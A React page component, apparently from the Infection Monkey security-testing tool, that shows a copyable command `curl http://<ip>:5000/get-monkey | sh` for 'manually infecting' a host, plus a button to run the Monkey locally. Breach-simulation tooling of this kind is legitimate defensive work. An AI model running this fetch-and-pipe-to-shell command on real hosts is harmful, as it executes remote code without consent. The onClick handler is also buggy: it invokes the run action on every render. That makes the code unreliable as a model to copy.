import React from 'react';
import {Button, Col, Well} from 'react-bootstrap';
import CopyToClipboard from 'react-copy-to-clipboard';
import {Icon} from 'react-fa';

class RunMonkeyPageComponent extends React.Component {
  constructor(props) {
    super(props);
    this.state = {
      ip: '0.0.0.0',
      cmd: '-',
      isRunning: true
    };
  }

  componentDidMount() {
    fetch('/api')
      .then(res => res.json())
      .then(res => this.setState({
        ip: res.ip,
        cmd: this.generateCmd(res.ip)
      }));

    fetch('/api/local-monkey')
      .then(res => res.json())
      .then(res => this.setState({
        isRunning: res['is_running']
      }));
  }

  generateCmd(ip) {
    return `curl http://${ip}:5000/get-monkey | sh`;
  }

  runLocalMonkey() {
    fetch('/api/local-monkey/run', {method: 'POST'})
      .then(res => res.json())
      .then(res => {
        this.setState({
          isRunning: res['is_running']
        });
      });
  }

  render() {
    return (
      <Col xs={8}>
        <h1 className="page-title">Run the Monkey</h1>
        <p>Run this snippet on a host for manually infecting it with a Monkey:</p>
        <Well>
          <CopyToClipboard text={this.state.cmd} className="pull-right">
            <Button style={{margin: '-0.5em'}} title="Copy to Clipboard">
              <Icon name="clipboard"/>
            </Button>
          </CopyToClipboard>
          <code>{this.state.cmd}</code>
        </Well>
        <p>
          Or simply click here to <a onClick={this.runLocalMonkey()}
                                     className="btn btn-default btn-sm"
                                     style={{'marginLeft': '0.2em'}}>Run on <b>{this.state.ip}</b></a>
          { this.state.isRunning ?
            <i className="text-success" style={{'marginLeft': '5px'}}>Running...</i>
            : ''}
        </p>
      </Col>
    );
  }
}

export default RunMonkeyPageComponent;
